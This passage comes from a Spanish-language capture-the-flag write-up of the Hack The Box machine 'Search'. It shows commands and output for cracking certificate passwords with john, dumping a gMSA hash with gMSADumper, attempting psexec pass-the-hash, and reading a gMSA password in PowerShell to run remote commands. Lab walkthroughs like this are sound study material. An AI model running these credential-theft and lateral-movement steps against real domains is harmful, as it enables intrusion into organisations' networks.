&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/cert_sierra ‚ùØ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; staff_pfx_hash
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pfx, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.pfx, .p12&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;PKCS#12 PBE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SHA1/SHA2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 256/256 AVX2 8x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Cost &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mac-type &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
misspissy        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;staff.pfx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:01:20 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2022-03-10 20:00&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.01237g/s 67886p/s 67886c/s 67886C/s misssnamy..missnono
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
 œÄ ~/htb/search/cert_sierra ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;49ac9039b55eeb44&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/search/cert_sierra ‚ùØ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; search_p12_hash
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pfx, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.pfx, .p12&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;PKCS#12 PBE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SHA1/SHA2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 256/256 AVX2 8x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Cost &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mac-type &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
misspissy        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;search-RESEARCH-CA.p12&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:01:30 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2022-03-10 20:02&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.01110g/s 60878p/s 60878c/s 60878C/s misssnamy..missnono
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
 œÄ ~/htb/search/cert_sierra ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;8f2cb27906541165\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;&lt;/p&gt;
&lt;h2 id=&#34;powershell-web&#34;&gt;PowerShell Web&lt;/h2&gt;
&lt;p&gt;Importamos y seleccionamos el certificado de &lt;code&gt;staff.pfx&lt;/code&gt; tras visitar &lt;code&gt;/staff&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_065019.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos un panel de acceso por PowerShell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_065341.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando las credenciales de &lt;code&gt;sierra.frye&lt;/code&gt; logramos acceder a este.&lt;/p&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    Sierra.Frye
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;USER: sierra.frye
PASS: &lt;span class=&#34;nv&#34;&gt;$$49&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;wide&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;jordan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;28&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;
COMPUTER NAME: RESEARCH
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_065916.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Tras examinar los directorios, no encontramos informaci√≥n relevante, por lo que revisamos nuevamente la informaci√≥n en Bloodhound.&lt;/p&gt;
&lt;h2 id=&#34;bloodhound-1&#34;&gt;BloodHound&lt;/h2&gt;
&lt;p&gt;Utilizando los queries predefinidos encontramos una ruta para obtener acceso como Domain Admin.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Inicialmente vemos a &lt;code&gt;sierra.frye&lt;/code&gt; miembro de los grupos &lt;code&gt;Birmingham-ITSec, ITSec&lt;/code&gt;, este √∫ltimo puede obtener la contrase√±a del usuario &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Seguidamente vemos que &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt; tiene permisos &lt;code&gt;GenericAll&lt;/code&gt; sobre el usuario &lt;code&gt;Tristan.Davies&lt;/code&gt; el cual pertenece al grupo de Domain Admins.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_084328.png&#34; alt=&#34;image&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bir-adfs-gmsa&#34;&gt;BIR-ADFS-GMSA&lt;/h2&gt;
&lt;h3 id=&#34;gmsa&#34;&gt;GMSA&lt;/h3&gt;
&lt;p&gt;Bloodhound sugiere utilizar &lt;code&gt;gmsapasswordreader.exe&lt;/code&gt; aunque no fu√© posible conectarnos desde la m√°quina a nuestro servidor samba para descargar este ejecutable.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_094803.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://github.com/micahvandeusen/gMSADumper&#34;&gt;gMSADumper&lt;/a&gt; para obtener el hash de &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt; utilizando las credenciales de &lt;code&gt;sierra.frye&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ gMSADumper main ‚úó ‚ùØ ./gMSADumper.py -u sierra.frye -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;$$49=wide=STRAIGHT=jordan=28$$18&amp;#39;&lt;/span&gt; -l 10.10.11.129 -d search.htb
Users or groups who can &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; BIR-ADFS-GMSA$:
 &amp;gt; ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
 œÄ gMSADumper main ‚úó ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sin embargo, tras intentar autenticarnos con el hash no fu√© posible, de igual forma crackear el hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ impacket-psexec &lt;span class=&#34;s2&#34;&gt;&amp;#34;BIR-ADFS-GMSA&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;@search.htb -hashes :e1e9fd9e46d0d747e1595167eedcec0f
Impacket v0.9.24 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on search.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; share &lt;span class=&#34;s1&#34;&gt;&amp;#39;ADMIN$&amp;#39;&lt;/span&gt; is not writable.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; share &lt;span class=&#34;s1&#34;&gt;&amp;#39;C$&amp;#39;&lt;/span&gt; is not writable.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; share &lt;span class=&#34;s1&#34;&gt;&amp;#39;CertEnroll&amp;#39;&lt;/span&gt; is not writable.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; share &lt;span class=&#34;s1&#34;&gt;&amp;#39;helpdesk&amp;#39;&lt;/span&gt; is not writable.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; share &lt;span class=&#34;s1&#34;&gt;&amp;#39;NETLOGON&amp;#39;&lt;/span&gt; is not writable.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share RedirectedFolders$
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file WFSVyazG.exe
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on search.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error opening SVCManager on search.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error performing the installation, cleaning up: Unable to open SVCManager
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Investigando sobre GMSA en Windows encontramos un post sobre &lt;a href=&#34;https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword&#34;&gt;ReadGMSAPassword&lt;/a&gt; en PowerShell, donde se muestran comandos para la lectura de la contrase√±a.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$gmsa&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ADServiceAccount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;BIR-ADFS-GMSA$&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Properties&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$mp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$gmsa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;ConvertFrom-ADManagedPasswordBlob&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$mp&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar los comandos vemos la contrase√±a en &amp;lsquo;texto plano&amp;rsquo; pero toma caracteres ilegibles, aunque vemos que tiene la &amp;lsquo;propiedad&amp;rsquo; &lt;code&gt;SecureString&lt;/code&gt; lo que podr√≠amos utilizar para ejecutar comandos como en &lt;a href=&#34;https://sckull.github.io/posts/arkham/#reverse-shell---batman-&#34;&gt;Arkham - HTB&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_101605.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Inicialmente en la variable &lt;code&gt;$secure&lt;/code&gt; vamos a obtener la propiedad &lt;code&gt;SecureString&lt;/code&gt; para usarla como contrase√±a en &lt;code&gt;PSCredential&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;c&#34;&gt;# GMSA&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$gmsa&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ADServiceAccount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;BIR-ADFS-GMSA$&amp;#39;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Properties&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$mp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$gmsa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$secure&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ConvertFrom-ADManagedPasswordBlob&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$mp&lt;/span&gt;

&lt;span class=&#34;c&#34;&gt;# Credentials&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;BIR-ADFS-GMSA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$secure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SecureCurrentPassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente con &lt;code&gt;Invoke-Command&lt;/code&gt; ejecutamos comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;c&#34;&gt;# Run Commands&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Invoke-Command&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;whoami&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RESEARCH&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el √∫ltimo comando vemos que tenemos acceso como &lt;code&gt;BIR-ADFS-GMSA&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_604_065927.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;tristan-davies&#34;&gt;Tristan Davies&lt;/h2&gt;
